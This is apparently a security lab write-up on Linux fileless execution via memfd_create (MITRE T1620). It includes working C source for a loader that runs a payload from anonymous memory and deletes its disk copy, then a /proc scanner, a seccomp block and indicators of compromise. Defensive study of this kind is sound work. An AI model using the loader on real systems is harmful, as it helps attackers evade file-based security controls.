01

Intel Brief

CONTEXT

MITRE ATT&CK T1620: adversaries load code into memory and execute it without the code ever existing as a file on the filesystem, defeating every control that starts from the file inventory: blocklists, quarantine, integrity monitors. This file runs the Linux memfd_create variant end to end, then detects it from the one place the kernel cannot hide: the process's own executable mapping. Two actors: the attacker, who owns the loader, the payload bytes, and the anonymous file; and the defender, who owns the /proc reads, the scanner, the kill, and the seccomp gate in the blue phase.

Why this technique. Every file-based control answers the same question: what is on this disk. A hash blocklist, a quarantine, an integrity monitor, a forensic image: all of them enumerate files. Reflective code loading changes the question by removing the file. The payload arrives as bytes (over the network, inside another process, it does not matter for this file), lands in anonymous memory, and executes. There is no path to blocklist, no file to quarantine, no directory entry for the monitor to hash. The defender who starts from the file inventory finds nothing, because there is nothing to find there. The detection has to move up a layer, from what is on the disk to what is executing.

Why not run it from disk and delete it. The obvious alternative is the naive fileless: write the payload to /tmp, execute it, delete the file. Break it on the concrete input: between the write and the delete, the file exists with a directory entry, visible to any sweep, any integrity monitor, any forensic image taken in that window. And the delete itself leaves the directory-mtime scar GH-016 demonstrated: the parent directory's timestamp moves when the entry is removed. memfd_create never creates a directory entry at all. There is no window where the file exists, and no scar where it was removed, because nothing was ever written to the filesystem.

Why not hide inside a host process. The other obvious alternatives are the earlier files' techniques: the LD_PRELOAD rootkit of GH-002, the ptrace injection of GH-003. Break them: both need a living host process to infect, and both leave their own artifacts, the preload library on disk, the injector's trace. The memfd payload is self-contained. It needs exactly one thing from the operating system, the anonymous file, and the dropper's single memfd_create call provides it. Fewer dependencies, fewer artifacts, a smaller surface for the defender to grip.

Why not pipe it into a shell. The third alternative is curl | sh: fetch the script, pipe it to the interpreter, never write it down. Break it: the interpreter is a real file with a real exe link. Only the script is remote; the thing doing the executing is /bin/sh, sitting on disk, hashed and inventoried like everything else. The memfd construction goes one layer deeper: not just the script but the EXECUTED IMAGE is anonymous. /proc/PID/exe does not resolve to a path at all.

The mechanism, in one line. An anonymous file is a file with no directory entry: it exists only as long as something holds it open, reachable solely through its file descriptor. A file descriptor is the kernel's handle for an open file: the small integer a process passes to read, write, and execute. memfd_create is the syscall that makes an anonymous memory-backed file and returns its descriptor. fexecve executes the program held open on a file descriptor, replacing the calling process. Reflective code loading is running code that was loaded into memory without ever existing as a filesystem file. Terms earned, no borrowing.

The concrete case, before the abstraction. In /tmp/gh017: payload.c prints a marker and sleeps, compiled to the payload ELF. loader.c calls memfd_create("ghost-payload", MFD_CLOEXEC), copies the ELF bytes into the descriptor, unlinks the disk copy it read from, and calls fexecve on the descriptor. After: ls shows no payload file, ps shows the process under its argv[0] name, and readlink /proc/PID/exe prints /memfd:ghost-payload (deleted). One syscall, one anonymous file, one exe link that resolves to memory instead of a path.

Scope. T1620 covers reflective loading broadly: memfd_create on Linux, anonymous mappings with PROT_EXEC, process hollowing and injection on other platforms. This file works the Linux memfd_create case end to end: the loader, the unlink, the fexecve, the /proc detection, the evidence-first containment, the whole-host scanner, and the seccomp gate. The payload is a benign stand-in that prints a marker and sleeps: it proves execution and touches nothing else. The lab runs in a disposable namespace because the technique's whole point is leaving no filesystem trace; the /proc reads are the defender's independent observation path.

Target Environment

LOADOUT

Ubuntu 24.04.5 LTS, x86-64, in a disposable namespace used only for this lab. 1

Build the lab

One disposable directory, built from scratch. rm -rf /tmp/gh017 clears any earlier take; mkdir -p makes the lab. Four sources go in through heredocs. payload.c is the benign stand-in: it prints "GHOSTLIGHT reflective payload executed (pid N)", flushes, and sleeps 600. It proves execution and touches nothing else. loader.c is the dropper: memfd_create with MFD_CLOEXEC, copy the ELF bytes from the staging path into the descriptor, close and unlink the staging copy, then fexecve the descriptor with argv[0] set to "ghost-payload". The executed program was never a file at exec time. scan.sh is the detector: it walks /proc/[0-9]*, readlinks each exe, and flags any that resolve to /memfd:*. gate.c is the prevention: a raw-BPF seccomp filter that returns EPERM for the memfd_create syscall number and allows everything else, installed with NO_NEW_PRIVS before execing its target. gcc -O2 builds all three binaries; the final ls -l proves the lab built.

bash
$ rm -rf /tmp/gh017 && mkdir -p /tmp/gh017 && cd /tmp/gh017 && cat > payload.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
/* Benign stand-in: proves execution, touches nothing. */
int main(void) {
    printf("GHOSTLIGHT reflective payload executed (pid %d)\n", getpid());
    fflush(stdout);
    sleep(600);
    return 0;
}
EOF
cat > loader.c <<'EOF'
#define _GNU_SOURCE
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
/* Dropper: anonymous file, copy the ELF in, unlink the staging copy,
   execute from the descriptor. The payload is never a file at exec time. */
int main(int argc, char **argv, char **envp) {
    if (argc < 2) { fprintf(stderr, "usage: %s <payload-elf>\n", argv[0]); return 2; }
    int mfd = memfd_create("ghost-payload", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); return 1; }
    int pfd = open(argv[1], O_RDONLY);
    if (pfd < 0) { perror("open payload"); return 1; }
    char buf[65536]; ssize_t n;
    while ((n = read(pfd, buf, sizeof buf)) > 0)
        if (write(mfd, buf, n) != n) { perror("write"); return 1; }
    close(pfd);
    unlink(argv[1]);
    char *args[] = { "ghost-payload", NULL };
    fexecve(mfd, args, envp);
    perror("fexecve");
    return 1;
}
EOF
cat > scan.sh <<'EOF'
#!/bin/sh
# memfd-scan: flag processes whose executable is anonymous memory.
# Good: every exe resolves to a real path. Bad: exe is /memfd:*.
found=0
for d in /proc/[0-9]*; do
    exe=$(readlink "$d/exe" 2>/dev/null) || continue
    case "$exe" in
        /memfd:*)
            pid=${d#/proc/}
            cmd=$(tr '\0' ' ' < "$d/cmdline" 2>/dev/null)
            echo "SUSPECT pid=$pid exe='$exe' cmd='$cmd'"
            found=1 ;;
    esac
done
[ "$found" -eq 0 ] && echo "clean: no memfd-backed executables"
EOF
cat > gate.c <<'EOF'
#define _GNU_SOURCE
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
/* Prevention gate: memfd_create -> EPERM, everything else allowed. */
static struct sock_filter f[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_memfd_create, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
};
static struct sock_fprog p = { .len = sizeof(f)/sizeof(f[0]), .filter = f };
int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <prog> [args]\n", argv[0]); return 2; }
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) { perror("no_new_privs"); return 1; }
    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &p)) { perror("seccomp"); return 1; }
    execvp(argv[1], argv + 1);
    perror("execvp");
    return 1;
}
EOF

Phase Red: run the unwritten

ATTACK

The loader runs the payload from anonymous memory, unlinks its own staging copy, and the exe link resolves to memory instead of a path.

1

The attack

./loader ./payload & backgrounds the dropper; fexecve replaces it with the payload, so the background job IS the payload now, and $! names its pid directly. The marker prints: the code is running. Then the inventory: ls /tmp/gh017/payload fails, no such file, because the loader unlinked its own staging copy after copying the bytes into the memfd. Phase Blue: read the exe link

DEFENSE

The defender does not trust the file listing. The defender reads the process's own executable mapping: scan the whole host for anonymous executables, drill into the exe link and the mappings by hand, learn the CLOEXEC lesson from the descriptors, then record the evidence before containing.

Here is the trap: running ps, seeing the process, running ls, finding no file, and concluding the process must be legitimate because there is nothing to quarantine. That is trusting the file inventory the attacker just bypassed. The detection is the exe link: readlink /proc/PID/exe while the process is still running.

DETECTION: the CLOEXEC lesson

ls -l /proc/$P/fd shows stdin, stdout, stderr, and no memfd descriptor. The loader passed MFD_CLOEXEC, so the kernel closed the anonymous file's descriptor at exec: the attacker hid the handle. A detector that only watches for memfd file descriptors misses the CLOEXEC variant entirely. The exe link and the mappings do not depend on the descriptor surviving, which is why the independent path reads them and not the fd table. Defense in depth starts with knowing which observation the attacker already defeated.

PREVENTION: the seccomp gate

DEFENSE

Honest limit. Killing the process destroys the memfd and with it any in-memory forensic artifact: the evidence.txt capture comes before the kill for exactly that reason, and the capture is treated as the record. 2

Monitor: scan /proc for memfd-backed executables on a schedule

The scheduled form of the phase-blue read: the scanner walks /proc, readlinks every exe, and flags any resolving to /memfd:*. The tell is any memfd-backed executable on a production host. D3FEND D3-PCSV: Process Code Segment Verification is the discipline behind it: the code segment is verified against a source of truth, and here the truth is that every executable must resolve to a real path.

bash
$ echo "--- DETECTION: the whole-host scanner ---"; /tmp/gh017/scan.sh; echo "(one command, every process, no trust in the file inventory)"
--- DETECTION: the whole-host scanner ---
SUSPECT pid=34 exe='/memfd:ghost-payload (deleted)' cmd='ghost-payload '
(one command, every process, no trust in the file inventory)

Honest limit. The scanner sees only its own PID namespace: run it host-wide, not inside a container, or the fileless process in another namespace is invisible to it. Legitimate software (browsers, language runtimes) uses memfd and must be allowlisted by exact name, and every allowlist entry is a name the attacker will try to wear. The poll interval sets the detection floor: a payload that runs and exits between polls is missed. Where available, pair the scanner with syscall auditing of memfd_create itself (auditctl -a always,exit -F arch=b64 -S memfd_create -k memfd-exec): stated with its exact syntax and its dependency, not demonstrated, because the audit subsystem is disabled in this lab and in many containers.

3

Prevent: deny memfd_create to the sandboxed workload

The durable form: a seccomp-BPF gate that returns EPERM for memfd_create, applied where the untrusted code runs. Demonstrated above: under the gate the loader fails closed before it can create the anonymous file. In production the gate lives in the container runtime's seccomp profile or the unit's SystemCallFilter=~memfd_create, not in a wrapper binary.

bash
$ echo "--- PREVENTION: the seccomp gate ---"; echo "(rebuild the dropper, then run it under the gate)"; cd /tmp/gh017 && gcc -O2 -o loader loader.c && gcc -O2 -o payload payload.c && ./gate ./loader ./payload; echo "loader rc=$?"; echo "--- the staging copy survives: the loader died before it could unlink ---"; ls -l /tmp/gh017/payload; echo "(under the gate the attack fails closed: no anonymous file, no execution)"
--- PREVENTION: the seccomp gate ---
(rebuild the dropper, then run it under the gate)
memfd_create: Operation not permitted
loader rc=1
--- the staging copy survives: the loader died before it could unlink ---
-rwxrwx--- 1 root root 16144 Sep 23 00:15 /tmp/gh017/payload
(under the gate the attack fails closed: no anonymous file, no execution)

Honest limit. The gate is per-process policy: it stops only the workloads it is applied to, and an attacker who controls the policy controls the gate. Blocking the syscall can break legitimate software that uses anonymous files, so the profile must be built from the workload's actual syscall set, not copied blindly. And it stops the memfd variant, not reflective loading by other primitives: anonymous PROT_EXEC mappings do not need memfd_create. Defense in depth, not a silver bullet.

Countermeasures verified

The fileless process was detected from its exe link, captured, and contained with the scanner confirming clean; the scanner is the scheduled check with the namespace and allowlist limits stated; the seccomp gate denies memfd_create and the rebuilt dropper failed closed. The file listing still says nothing ran. The exe link does not agree.

Debrief

TAKEAWAY

When the file listing says nothing ran, read the exe link: code that was never a file still has to execute from somewhere.

IOC checklist: signs this technique was used

  • A process whose /proc/PID/exe resolves to /memfd:* (deleted) instead of a path
  • Anonymous executable mappings (r-xp) in /proc/PID/maps with a memfd tag and no file
  • A process name with no corresponding file anywhere on the filesystem
  • A dropper binary whose recent execution left no payload artifact behind
  • Audit events for the memfd_create syscall from an unexpected process, where auditing is enabled

Reproducibility checklist

  • Verified on Ubuntu 24.04.5 LTS, x86-64, on 2026-09-22
  • Both recordings are real executions on that platform, not simulations
  • Runs as root in a disposable namespace (the lab compiles its own loader, payload, scanner, and gate; the assumed breach: something on the box delivered the dropper)
  • Cleanup: rm -rf /tmp/gh017; verify with ls /tmp
